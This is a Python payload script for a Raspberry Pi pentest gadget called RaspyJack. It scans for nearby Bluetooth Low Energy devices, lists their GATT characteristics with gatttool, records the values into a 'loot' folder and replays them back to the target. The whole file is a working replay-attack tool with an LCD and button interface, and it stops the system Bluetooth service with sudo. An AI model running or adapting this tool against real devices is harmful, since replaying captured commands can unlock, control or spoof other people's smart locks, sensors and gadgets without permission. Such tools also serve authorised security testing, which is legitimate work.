#!/usr/bin/env python3
"""
RaspyJack Payload -- BLE GATT Replay Attack
=============================================
Author: 7h30th3r0n3

Scan for BLE devices, connect to a target, enumerate GATT
characteristics, record notifications/reads, and replay recorded
values back to the device.

Setup / Prerequisites:
  - Requires Bluetooth adapter.
  - Requires gatttool (from bluez package).

Steps:
  1) Scan for BLE devices
  2) Select target and connect
  3) Enumerate GATT services/characteristics
  4) Record mode: log all GATT notifications and reads
  5) Replay mode: write recorded values back to device

Controls:
  OK        -- Select device / toggle record
  KEY1      -- Switch record/replay mode
  KEY2      -- Export sequence to loot
  UP / DOWN -- Scroll device/characteristic list
  KEY3      -- Exit

Uses: gatttool, hcitool via subprocess
Loot: /root/Raspyjack/loot/BLEReplay/
"""

import os
import sys
import re
import json
import time
import asyncio
import threading
import subprocess
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button
from payloads._iface_helper import select_bt_interface

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
LOOT_DIR = "/root/Raspyjack/loot/BLEReplay"
os.makedirs(LOOT_DIR, exist_ok=True)

HCI_DEV = None  # set in main() via select_bt_interface
SCAN_TIMEOUT = 10
ROWS_VISIBLE = 7

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
devices = []            # list of dicts: {addr, name, rssi}
characteristics = []    # list of dicts: {handle, uuid, properties}
recorded_sequence = []  # list of dicts: {timestamp, handle, value}
scroll_pos = 0
status_msg = "Idle"
view_mode = "scan"      # scan | chars | record | replay
mode = "record"         # record | replay
recording = False
replaying = False
target_device = None    # dict: {addr, name}
connected = False

_record_proc = None

# ---------------------------------------------------------------------------
# BLE scanning (bleak)
# ---------------------------------------------------------------------------

async def _bleak_scan(timeout=10):
    """Discover BLE devices using bleak (async)."""
    from bleak import BleakScanner
    found = await BleakScanner.discover(timeout=timeout)
    return [
        {"addr": d.address.upper(),
         "name": d.name or "(unknown)",
         "rssi": getattr(d, "rssi", -99)}
        for d in found
    ]


def _ble_scan():
    """Scan for BLE devices using bleak."""
    # Stop bluetoothd for raw HCI access, bring adapter up
    subprocess.run(["sudo", "systemctl", "stop", "bluetooth"],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "hciconfig", HCI_DEV, "down"],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "hciconfig", HCI_DEV, "up"],
                   capture_output=True, timeout=5)
    time.sleep(0.3)

    try:
        results = asyncio.run(_bleak_scan(SCAN_TIMEOUT))
    except Exception:
        results = []

    # De-duplicate by address
    found = {}
    for dev in results:
        addr = dev["addr"]
        if addr not in found:
            found[addr] = dev
        elif dev["name"] != "(unknown)" and found[addr]["name"] == "(unknown)":
            found[addr] = {**found[addr], "name": dev["name"]}

    return list(found.values())


def do_scan():
    """Background BLE scan."""
    global devices, scroll_pos, status_msg
    with lock:
        status_msg = "Scanning BLE..."
    found = _ble_scan()
    with lock:
        devices = found
        scroll_pos = 0
        status_msg = f"Found {len(found)} devices"


# ---------------------------------------------------------------------------
# GATT enumeration
# ---------------------------------------------------------------------------

def _enumerate_characteristics(addr):
    """Enumerate GATT characteristics using gatttool."""
    chars = []

    try:
        # Primary services
        result = subprocess.run(
            ["gatttool", "-i", HCI_DEV, "-b", addr, "--primary"],
            capture_output=True, text=True, timeout=15,
        )
        services = []
        for line in result.stdout.splitlines():
            match = re.search(r"uuid:\s*([0-9a-fA-F-]+)", line)
            if match:
                services.append(match.group(1))

        # Characteristics
        result = subprocess.run(
            ["gatttool", "-i", HCI_DEV, "-b", addr, "--characteristics"],
            capture_output=True, text=True, timeout=15,
        )
        for line in result.stdout.splitlines():
            # handle = 0x000a, char properties = 0x12, char value handle = 0x000b, uuid = ...
            match = re.search(
                r"handle\s*=\s*(0x[0-9a-fA-F]+).*"
                r"properties\s*=\s*(0x[0-9a-fA-F]+).*"
                r"value handle\s*=\s*(0x[0-9a-fA-F]+).*"
                r"uuid\s*=\s*([0-9a-fA-F-]+)",
                line,
            )
            if match:
                chars.append({
                    "handle": match.group(1),
                    "properties": match.group(2),
                    "value_handle": match.group(3),
                    "uuid": match.group(4),
                })
    except subprocess.TimeoutExpired:
        pass
    except Exception:
        pass

    return chars


def do_connect(device):
    """Connect to device and enumerate characteristics."""
    global target_device, characteristics, connected, status_msg, view_mode

    with lock:
        target_device = device
        status_msg = f"Connecting {device['addr'][-8:]}..."

    chars = _enumerate_characteristics(device["addr"])

    with lock:
        characteristics = chars
        connected = len(chars) > 0
        if connected:
            status_msg = f"{len(chars)} chars found"
            view_mode = "chars"
        else:
            status_msg = "Connect failed / no chars"


# ---------------------------------------------------------------------------
# GATT read
# ---------------------------------------------------------------------------

def _read_characteristic(addr, handle):
    """Read a single GATT characteristic value."""
    try:
        result = subprocess.run(
            ["gatttool", "-i", HCI_DEV, "-b", addr,
             "--char-read", "-a", handle],
            capture_output=True, text=True, timeout=10,
        )
        match = re.search(r"value:\s*([0-9a-fA-F\s]+)", result.stdout)
        if match:
            return match.group(1).strip()
    except Exception:
        pass
    return None


def _write_characteristic(addr, handle, value):
    """Write a value to a GATT characteristic."""
    try:
        result = subprocess.run(
            ["gatttool", "-i", HCI_DEV, "-b", addr,
             "--char-write-req", "-a", handle, "-n", value.replace(" ", "")],
            capture_output=True, text=True, timeout=10,
        )
        return "successfully" in result.stdout.lower()
    except Exception:
        return False


# ---------------------------------------------------------------------------
# Record mode
# ---------------------------------------------------------------------------

def _record_loop():
    """Record all readable characteristics periodically."""
    global recording

    if not target_device or not characteristics:
        with lock:
            recording = False
        return

    addr = target_device["addr"]
    interval = 1.0

    while True:
        with lock:
            if not recording:
                break

        for char in characteristics:
            with lock:
                if not recording:
                    break

            value = _read_characteristic(addr, char["value_handle"])
            if value:
                entry = {
                    "timestamp": datetime.now().isoformat(),
                    "handle": char["value_handle"],
                    "uuid": char["uuid"],
                    "value": value,
                }
                with lock:
                    recorded_sequence.append(entry)
                    if len(recorded_sequence) > 1000:
                        recorded_sequence.pop(0)

        with lock:
            status_msg = f"Recorded: {len(recorded_sequence)} values"

        time.sleep(interval)


def start_recording():
    """Start recording GATT values."""
    global recording, status_msg, view_mode
    with lock:
        if recording:
            return
        recording = True
        status_msg = "Recording..."
        view_mode = "record"
    threading.Thread(target=_record_loop, daemon=True).start()


def stop_recording():
    """Stop recording."""
    global recording, status_msg
    with lock:
        recording = False
        status_msg = f"Stopped. {len(recorded_sequence)} values"


# ---------------------------------------------------------------------------
# Replay mode
# ---------------------------------------------------------------------------

def _replay_loop():
    """Replay recorded values to the target device."""
    global replaying, status_msg

    if not target_device or not recorded_sequence:
        with lock:
            replaying = False
            status_msg = "Nothing to replay"
        return

    addr = target_device["addr"]

    with lock:
        seq = list(recorded_sequence)
        replaying = True

    total = len(seq)
    success_count = 0

    for i, entry in enumerate(seq):
        with lock:
            if not replaying:
                break
            status_msg = f"Replay {i + 1}/{total}"

        ok = _write_characteristic(addr, entry["handle"], entry["value"])
        if ok:
            success_count += 1
        time.sleep(0.2)

    with lock:
        replaying = False
        status_msg = f"Replayed: {success_count}/{total}"


def start_replay():
    """Start replaying recorded sequence."""
    global replaying, status_msg, view_mode
    with lock:
        if replaying:
            return
        status_msg = "Replaying..."
        view_mode = "replay"
    threading.Thread(target=_replay_loop, daemon=True).start()


def stop_replay():
    """Stop replay."""
    global replaying
    with lock:
        replaying = False


# ---------------------------------------------------------------------------
# Export
# ---------------------------------------------------------------------------

def export_sequence():
    """Export recorded sequence to loot."""
    with lock:
        if not recorded_sequence:
            return None
        data = {
            "target": target_device["addr"] if target_device else "unknown",
            "target_name": target_device["name"] if target_device else "unknown",
            "characteristics": list(characteristics),
            "sequence": list(recorded_sequence),
            "exported": datetime.now().isoformat(),
        }

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = os.path.join(LOOT_DIR, f"ble_replay_{ts}.json")
    with open(path, "w") as f:
        json.dump(data, f, indent=2)
    return path


# ---------------------------------------------------------------------------
# Drawing
# ---------------------------------------------------------------------------

def _draw_header(d, title):
    d.rectangle((0, 0, 127, 13), fill="#111")
    d.text((2, 1), title, font=font, fill="#00AAFF")
    with lock:
        active = recording or replaying
    d.ellipse((118, 3, 122, 7), fill="#00FF00" if active else "#FF0000")


def _draw_footer(d, text):
    d.rectangle((0, 116, 127, 127), fill="#111")
    d.text((2, 117), text[:24], font=font, fill="#AAA")


def draw_scan_view():
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    _draw_header(d, "BLE REPLAY")

    with lock:
        msg = status_msg
        sc = scroll_pos

    d.text((2, 15), msg[:22], font=font, fill="#FFAA00")

    if not devices:
        d.text((10, 50), "No devices found", font=font, fill="#666")
        d.text((10, 64), "OK to scan", font=font, fill="#666")
    else:
        visible = devices[sc:sc + ROWS_VISIBLE]
        for i, dev in enumerate(visible):
            y = 28 + i * 12
            color = "#FFFF00" if i == 0 else "#CCCCCC"
            name = dev["name"][:10] or "??"
            d.text((2, y), f"{name} {dev['addr'][-8:]}", font=font, fill=color)

    _draw_footer(d, "OK:Scan/Sel K3:Exit")
    LCD.LCD_ShowImage(img, 0, 0)


def draw_chars_view():
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    _draw_header(d, "GATT CHARS")

    with lock:
        msg = status_msg
        sc = scroll_pos
        chars = list(characteristics)
        m = mode

    d.text((2, 15), f"Mode: {m.upper()}", font=font, fill="#FFAA00")

    if not chars:
        d.text((10, 50), "No characteristics", font=font, fill="#666")
    else:
        visible = chars[sc:sc + ROWS_VISIBLE - 1]
        for i, ch in enumerate(visible):
            y = 28 + i * 12
            color = "#FFFF00" if i == 0 else "#CCCCCC"
            uuid_short = ch["uuid"][-8:]
            d.text((2, y), f"{ch['value_handle']} {uuid_short}", font=font, fill=color)

    _draw_footer(d, "OK:Rec/Rep K1:Mode K3:X")
    LCD.LCD_ShowImage(img, 0, 0)


def draw_record_view():
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    _draw_header(d, "RECORDING")

    with lock:
        msg = status_msg
        rec = recording
        count = len(recorded_sequence)
        sc = scroll_pos

    d.text((2, 18), msg[:22], font=font, fill="#00FF00" if rec else "#FF4444")
    d.text((2, 32), f"Values: {count}", font=font, fill="white")

    # Show last few recorded values
    with lock:
        recent = recorded_sequence[-5:]
    for i, entry in enumerate(recent):
        y = 48 + i * 12
        val_short = entry["value"][:12]
        d.text((2, y), f"{entry['handle']} {val_short}", font=font, fill="#888")

    label = "OK:Stop" if rec else "OK:Start"
    _draw_footer(d, f"{label} K2:Export K3:X")
    LCD.LCD_ShowImage(img, 0, 0)


def draw_replay_view():
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    _draw_header(d, "REPLAYING")

    with lock:
        msg = status_msg
        rep = replaying
        count = len(recorded_sequence)

    d.text((2, 18), msg[:22], font=font, fill="#00FF00" if rep else "#FF4444")
    d.text((2, 32), f"Sequence: {count} values", font=font, fill="white")

    if target_device:
        d.text((2, 48), f"Target: {target_device['addr']}", font=font, fill="#888")
        d.text((2, 60), f"Name: {target_device['name'][:16]}", font=font, fill="#888")

    label = "OK:Stop" if rep else "OK:Start"
    _draw_footer(d, f"{label} K1:Mode K3:X")
    LCD.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global scroll_pos, view_mode, mode, status_msg, HCI_DEV

    HCI_DEV = select_bt_interface(LCD, font, PINS, GPIO)
    if not HCI_DEV:
        GPIO.cleanup()
        return 1

    # Splash
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.text((10, 16), "BLE GATT REPLAY", font=font, fill="#00AAFF")
    d.text((4, 36), "Record & replay BLE", font=font, fill="#888")
    d.text((4, 48), "GATT characteristics", font=font, fill="#888")
    d.text((4, 66), "OK=Scan  K1=Mode", font=font, fill="#666")
    d.text((4, 78), "K2=Export K3=Exit", font=font, fill="#666")
    LCD.LCD_ShowImage(img, 0, 0)
    time.sleep(0.5)

    try:
        while True:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                if view_mode in ("chars", "record", "replay"):
                    stop_recording()
                    stop_replay()
                    with lock:
                        view_mode = "scan"
                        scroll_pos = 0
                    time.sleep(0.25)
                    continue
                break

            if view_mode == "scan":
                if btn == "OK":
                    with lock:
                        if devices and scroll_pos < len(devices):
                            dev = devices[scroll_pos]
                        else:
                            dev = None
                    if dev:
                        threading.Thread(
                            target=do_connect, args=(dev,), daemon=True,
                        ).start()
                    else:
                        threading.Thread(target=do_scan, daemon=True).start()
                    time.sleep(0.3)
                elif btn == "UP":
                    with lock:
                        scroll_pos = max(0, scroll_pos - 1)
                    time.sleep(0.15)
                elif btn == "DOWN":
                    with lock:
                        scroll_pos = min(max(0, len(devices) - 1), scroll_pos + 1)
                    time.sleep(0.15)
                elif btn == "KEY1":
                    # Force rescan
                    threading.Thread(target=do_scan, daemon=True).start()
                    time.sleep(0.3)
                draw_scan_view()

            elif view_mode == "chars":
                if btn == "OK":
                    with lock:
                        m = mode
                    if m == "record":
                        start_recording()
                    else:
                        start_replay()
                    time.sleep(0.3)
                elif btn == "KEY1":
                    with lock:
                        mode = "replay" if mode == "record" else "record"
                        status_msg = f"Mode: {mode}"
                    time.sleep(0.25)
                elif btn == "UP":
                    with lock:
                        scroll_pos = max(0, scroll_pos - 1)
                    time.sleep(0.15)
                elif btn == "DOWN":
                    with lock:
                        scroll_pos = min(
                            max(0, len(characteristics) - 1), scroll_pos + 1
                        )
                    time.sleep(0.15)
                elif btn == "KEY2":
                    path = export_sequence()
                    if path:
                        with lock:
                            status_msg = f"Saved: {os.path.basename(path)[:14]}"
                    else:
                        with lock:
                            status_msg = "Nothing to export"
                    time.sleep(0.3)
                draw_chars_view()

            elif view_mode == "record":
                if btn == "OK":
                    with lock:
                        rec = recording
                    if rec:
                        stop_recording()
                    else:
                        start_recording()
                    time.sleep(0.3)
                elif btn == "KEY1":
                    stop_recording()
                    with lock:
                        mode = "replay"
                        view_mode = "replay"
                    time.sleep(0.25)
                elif btn == "KEY2":
                    path = export_sequence()
                    if path:
                        with lock:
                            status_msg = f"Exported: {os.path.basename(path)[:12]}"
                    time.sleep(0.3)
                draw_record_view()

            elif view_mode == "replay":
                if btn == "OK":
                    with lock:
                        rep = replaying
                    if rep:
                        stop_replay()
                    else:
                        start_replay()
                    time.sleep(0.3)
                elif btn == "KEY1":
                    stop_replay()
                    with lock:
                        mode = "record"
                        view_mode = "record"
                    time.sleep(0.25)
                elif btn == "KEY2":
                    path = export_sequence()
                    if path:
                        with lock:
                            status_msg = f"Exported: {os.path.basename(path)[:12]}"
                    time.sleep(0.3)
                draw_replay_view()

            time.sleep(0.05)

    finally:
        stop_recording()
        stop_replay()
        try:
            LCD.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
